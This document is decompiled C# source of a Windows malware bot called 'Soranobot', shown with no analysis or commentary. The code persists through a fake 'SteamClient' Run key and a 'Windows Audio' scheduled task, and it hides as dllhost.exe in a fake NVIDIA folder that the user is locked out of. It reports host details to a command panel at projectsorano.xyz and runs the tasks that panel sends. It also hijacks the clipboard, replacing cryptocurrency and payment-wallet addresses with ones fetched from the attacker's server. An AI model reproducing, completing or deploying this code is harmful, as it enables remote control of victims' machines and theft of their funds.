using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Soranobot.Classes;

namespace Soranobot
{
	// Token: 0x02000003 RID: 3
	internal class Program
	{
		// Token: 0x06000003 RID: 3 RVA: 0x00002260 File Offset: 0x00000460
		private static void Main(string[] args)
		{
			if (!Program.InstanceCheck())
			{
				Environment.Exit(0);
			}
			Program.Copy();
			Program.CreateTask();
			Program.blocker();
			new Thread(new ThreadStart(Program.mainthread)).Start();
			Program.s = new Thread(new ThreadStart(Program.startthread));
			Program.s.Start();
			Program.RawSettings.Version = "3.3.8";
			Program.OnClipboardChange += Program.ClipboardMonitor_OnClipboardChange;
			Program.Start();
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000022E0 File Offset: 0x000004E0
		private static void mainthread()
		{
			string hardwareID = Identification.getHardwareID();
			for (;;)
			{
				try
				{
					string input = Identification.osName();
					string input2;
					if (Misc.isAdmin())
					{
						input2 = "Admin";
					}
					else
					{
						input2 = "User";
					}
					string location = Misc.getLocation();
					string name = new Computer().Name;
					string input3 = Misc.lastReboot();
					string text = string.Concat(new string[]
					{
						"id=",
						Communication.encrypt(hardwareID),
						"&os=",
						Communication.encrypt(input),
						"&pv=",
						Communication.encrypt(input2),
						"&ip=",
						Communication.encrypt(location),
						"&cn=",
						Communication.encrypt(name),
						"&lr=",
						Communication.encrypt(input3),
						"&ct=",
						Communication.encrypt(Settings.ctask),
						"&bv=",
						Communication.encrypt(Settings.botv)
					});
					string text2 = Communication.decrypt(Communication.makeRequest(Settings.panelurl, text));
					if (text2 != "rqf" && text2.Contains("newtask"))
					{
						string[] array = text2.Split(new char[]
						{
							':'
						});
						string text3 = array[1];
						if (text3 != Settings.ctask)
						{
							Settings.ctask = text3;
							if (Misc.processTask(array[2], array[3]))
							{
								Communication.makeRequest(Settings.panelurl, string.Concat(new string[]
								{
									text,
									"&op=",
									Communication.encrypt("1"),
									"&td=",
									Communication.encrypt(text3)
								}));
								if (Encoding.UTF8.GetString(Convert.FromBase64String(array[2])) == "10" || Encoding.UTF8.GetString(Convert.FromBase64String(array[2])) == "9")
								{
									Communication.makeRequest(Settings.panelurl, text + "&uni=" + Communication.encrypt("1"));
									Environment.Exit(0);
								}
							}
						}
					}
				}
				catch
				{
				}
				Thread.Sleep(Settings.reqinterval * 60000);
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002528 File Offset: 0x00000728
		private static void startthread()
		{
			for (;;)
			{
				try
				{
					if (!Misc.keyExists("SteamClient"))
					{
						Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("SteamClient", "\"" + Misc.getLocation() + "\"", RegistryValueKind.String);
					}
				}
				catch
				{
				}
				Thread.Sleep(3000);
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002594 File Offset: 0x00000794
		private static void CreateTask()
		{
			try
			{
				Process.Start(new ProcessStartInfo
				{
					FileName = "schtasks.exe",
					CreateNoWindow = false,
					WindowStyle = ProcessWindowStyle.Hidden,
					Arguments = string.Concat(new string[]
					{
						"/create /sc MINUTE /mo 1 /tn \"Windows Audio\" /tr \"",
						Program.dir,
						"\\",
						Program.file,
						"\" /f"
					})
				});
			}
			catch
			{
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002618 File Offset: 0x00000818
		private static void Copy()
		{
			try
			{
				if (!Directory.Exists(Program.dir))
				{
					Directory.CreateDirectory(Program.dir);
				}
				if (!File.Exists(Program.dir + "\\" + Program.file))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Program.dir + "\\" + Program.file);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002690 File Offset: 0x00000890
		public static void ClipboardMonitor_OnClipboardChange(Program.ClipboardFormat format, object data)
		{
			try
			{
				if (format == Program.ClipboardFormat.Text)
				{
					string text = Clipboard.GetText();
					if (!(text == Program.text))
					{
						Program.CoinType? type = Program.GetType(text);
						if (type != null)
						{
							Program.GetClipboardText(type, text);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000026F0 File Offset: 0x000008F0
		private static Program.CoinType? GetType(string cliptext)
		{
			Program.CoinType? result;
			try
			{
				if (cliptext.StartsWith("1") && !cliptext.Contains("0") && !cliptext.Contains("I") && !cliptext.Contains("l") && !cliptext.Contains("O") && cliptext.Length == 34)
				{
					result = new Program.CoinType?(Program.CoinType.BTC);
				}
				else if (cliptext.StartsWith("L") && !cliptext.Contains("0") && !cliptext.Contains("I") && !cliptext.Contains("l") && !cliptext.Contains("O") && cliptext.Length == 34)
				{
					result = new Program.CoinType?(Program.CoinType.LTC);
				}
				else if (cliptext.StartsWith("0x") && cliptext.Length == 42)
				{
					result = new Program.CoinType?(Program.CoinType.ETH);
				}
				else if (cliptext.StartsWith("Z") && cliptext.Length == 13)
				{
					result = new Program.CoinType?(Program.CoinType.WMZ);
				}
				else if (cliptext.StartsWith("+") && cliptext.Length == 12)
				{
					result = new Program.CoinType?(Program.CoinType.Qiwi);
				}
				else if (cliptext.StartsWith("79") && cliptext.Length == 11)
				{
					result = new Program.CoinType?(Program.CoinType.Qiwi);
				}
				else if (cliptext.StartsWith("380") && cliptext.Length == 12)
				{
					result = new Program.CoinType?(Program.CoinType.Qiwi);
				}
				else if (cliptext.StartsWith("4") && (cliptext.Length == 95 || cliptext.Length == 106))
				{
					result = new Program.CoinType?(Program.CoinType.XMR);
				}
				else if (cliptext.StartsWith("R") && cliptext.Length == 13)
				{
					result = new Program.CoinType?(Program.CoinType.WMR);
				}
				else if (cliptext.StartsWith("E") && cliptext.Length == 13)
				{
					result = new Program.CoinType?(Program.CoinType.WME);
				}
				else if (cliptext.StartsWith("+380") && cliptext.Length == 13)
				{
					result = new Program.CoinType?(Program.CoinType.Qiwi);
				}
				else
				{
					result = null;
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
				result = null;
			}
			return result;
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002928 File Offset: 0x00000B28
		private static void GetClipboardText(Program.CoinType? coinType, string copied)
		{
			try
			{
				string text = new WebClient().DownloadString(string.Concat(new object[]
				{
					Program.RawSettings.SiteUrl,
					"clipper.php?type=",
					coinType,
					"&user=&copy=",
					copied,
					"&hwid=",
					Program.RawSettings.HWID
				})).Normalize().Replace(" ", string.Empty).Replace("\n", "").Replace("\r\n", "");
				Console.WriteLine(text);
				Program.text = text;
				if (!(text == "") && !(text == " "))
				{
					Clipboard.SetText(text);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x14000001 RID: 1
		// (add) Token: 0x0600000B RID: 11 RVA: 0x00002A00 File Offset: 0x00000C00
		// (remove) Token: 0x0600000C RID: 12 RVA: 0x00002A34 File Offset: 0x00000C34
		public static event Program.OnClipboardChangeEventHandler OnClipboardChange;

		// Token: 0x0600000D RID: 13 RVA: 0x00002068 File Offset: 0x00000268
		public static void Start()
		{
			Program.ClipboardWatcher.Start();
			Program.ClipboardWatcher.OnClipboardChange += delegate(Program.ClipboardFormat format, object data)
			{
				Program.OnClipboardChange(format, data);
			};
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002A68 File Offset: 0x00000C68
		private static bool InstanceCheck()
		{
			bool result;
			Program.InstanceCheckMutex = new Mutex(true, "UNIC_KEY", ref result);
			return result;
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002A88 File Offset: 0x00000C88
		public static void blocker()
		{
			try
			{
				string userName = Environment.UserName;
				DirectorySecurity accessControl = Directory.GetAccessControl(Program.dir);
				FileSystemAccessRule rule = new FileSystemAccessRule(userName, FileSystemRights.FullControl, AccessControlType.Deny);
				accessControl.AddAccessRule(rule);
				Directory.SetAccessControl(Program.dir, accessControl);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x04000001 RID: 1
		public static Thread s;

		// Token: 0x04000002 RID: 2
		private static string text = "";

		// Token: 0x04000003 RID: 3
		private static string dir = Environment.GetEnvironmentVariable("AppData") + "\\NVIDIA GeForce Experience";

		// Token: 0x04000004 RID: 4
		private static string file = "dllhost.exe";

		// Token: 0x04000005 RID: 5
		private static Process proc;

		// Token: 0x04000007 RID: 7
		private static Mutex InstanceCheckMutex;

		// Token: 0x02000004 RID: 4
		// (Invoke) Token: 0x06000013 RID: 19
		public delegate void OnClipboardChangeEventHandler(Program.ClipboardFormat format, object data);

		// Token: 0x02000005 RID: 5
		public enum ClipboardFormat : byte
		{
			// Token: 0x04000009 RID: 9
			Text
		}

		// Token: 0x02000006 RID: 6
		internal static class RawSettings
		{
			// Token: 0x0400000A RID: 10
			public static string SiteUrl = "http://projectsorano.xyz/";

			// Token: 0x0400000B RID: 11
			public static string Version;

			// Token: 0x0400000C RID: 12
			public static string HWID;
		}

		// Token: 0x02000007 RID: 7
		internal enum CoinType
		{
			// Token: 0x0400000E RID: 14
			BTC,
			// Token: 0x0400000F RID: 15
			LTC,
			// Token: 0x04000010 RID: 16
			ETH,
			// Token: 0x04000011 RID: 17
			XMR,
			// Token: 0x04000012 RID: 18
			Qiwi,
			// Token: 0x04000013 RID: 19
			WMR,
			// Token: 0x04000014 RID: 20
			WMZ,
			// Token: 0x04000015 RID: 21
			WME
		}

		// Token: 0x02000008 RID: 8
		private class ClipboardWatcher : Form
		{
			// Token: 0x14000002 RID: 2
			// (add) Token: 0x06000017 RID: 23 RVA: 0x00002AD8 File Offset: 0x00000CD8
			// (remove) Token: 0x06000018 RID: 24 RVA: 0x00002B0C File Offset: 0x00000D0C
			public static event Program.ClipboardWatcher.OnClipboardChangeEventHandler OnClipboardChange;

			// Token: 0x06000019 RID: 25 RVA: 0x000020D6 File Offset: 0x000002D6
			public static void Start()
			{
				if (Program.ClipboardWatcher.mInstance != null)
				{
					return;
				}
				Thread thread = new Thread(delegate(object x)
				{
					Application.Run(new Program.ClipboardWatcher());
				});
				thread.SetApartmentState(ApartmentState.STA);
				thread.Start();
			}

			// Token: 0x0600001A RID: 26 RVA: 0x00002110 File Offset: 0x00000310
			protected override void SetVisibleCore(bool value)
			{
				this.CreateHandle();
				Program.ClipboardWatcher.mInstance = this;
				Program.ClipboardWatcher.nextClipboardViewer = Program.ClipboardWatcher.SetClipboardViewer(Program.ClipboardWatcher.mInstance.Handle);
				base.SetVisibleCore(false);
			}

			// Token: 0x0600001B RID: 27
			[DllImport("User32.dll", CharSet = CharSet.Auto)]
			private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);

			// Token: 0x0600001C RID: 28
			[DllImport("user32.dll", CharSet = CharSet.Auto)]
			private static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

			// Token: 0x0600001D RID: 29 RVA: 0x00002B40 File Offset: 0x00000D40
			protected override void WndProc(ref Message m)
			{
				int msg = m.Msg;
				if (msg == 776)
				{
					Program.ClipboardWatcher.ClipChanged();
					Program.ClipboardWatcher.SendMessage(Program.ClipboardWatcher.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
					return;
				}
				if (msg != 781)
				{
					base.WndProc(ref m);
					return;
				}
				if (m.WParam == Program.ClipboardWatcher.nextClipboardViewer)
				{
					Program.ClipboardWatcher.nextClipboardViewer = m.LParam;
					return;
				}
				Program.ClipboardWatcher.SendMessage(Program.ClipboardWatcher.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
			}

			// Token: 0x0600001E RID: 30 RVA: 0x00002BCC File Offset: 0x00000DCC
			private static void ClipChanged()
			{
				try
				{
					IDataObject dataObject = Clipboard.GetDataObject();
					Program.ClipboardFormat? clipboardFormat = null;
					foreach (string text in Program.ClipboardWatcher.formats)
					{
						if (dataObject.GetDataPresent(text))
						{
							clipboardFormat = new Program.ClipboardFormat?((Program.ClipboardFormat)Enum.Parse(typeof(Program.ClipboardFormat), text));
							break;
						}
					}
					object data = dataObject.GetData(clipboardFormat.ToString());
					if (data != null && clipboardFormat != null)
					{
						Program.ClipboardWatcher.OnClipboardChange(clipboardFormat.Value, data);
					}
				}
				catch
				{
				}
			}

			// Token: 0x04000016 RID: 22
			private static readonly string[] formats = Enum.GetNames(typeof(Program.ClipboardFormat));

			// Token: 0x04000017 RID: 23
			private const int WM_DRAWCLIPBOARD = 776;

			// Token: 0x04000018 RID: 24
			private const int WM_CHANGECBCHAIN = 781;

			// Token: 0x04000019 RID: 25
			private static Program.ClipboardWatcher mInstance;

			// Token: 0x0400001A RID: 26
			private static IntPtr nextClipboardViewer;

			// Token: 0x02000009 RID: 9
			// (Invoke) Token: 0x06000022 RID: 34
			public delegate void OnClipboardChangeEventHandler(Program.ClipboardFormat format, object data);
		}
	}
}
